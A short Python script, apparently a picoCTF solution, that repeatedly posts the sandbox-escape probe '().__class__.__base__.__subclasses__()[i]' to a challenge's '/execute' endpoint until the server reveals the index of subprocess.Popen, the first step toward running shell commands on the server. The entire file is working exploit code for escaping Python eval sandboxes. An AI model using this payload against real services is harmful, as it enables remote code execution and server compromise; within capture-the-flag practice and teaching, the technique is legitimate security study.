import requests

i = 300
header = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8'
}
wanted_rsp = "<class 'subprocess.Popen'>"

while(True):
    print(f'[!] Sending in loop {i}')
    payload_extract = {
    'code': f'().__class__.__base__.__subclasses__()[{i}]'
}
    print(payload_extract)
    r = requests.post(url='http://shape-facility.picoctf.net:54066/execute', headers=header, data=payload_extract)
    if(wanted_rsp in r.text):
        break
    i += 1

print('[+] Found Popen() in ' + str(i))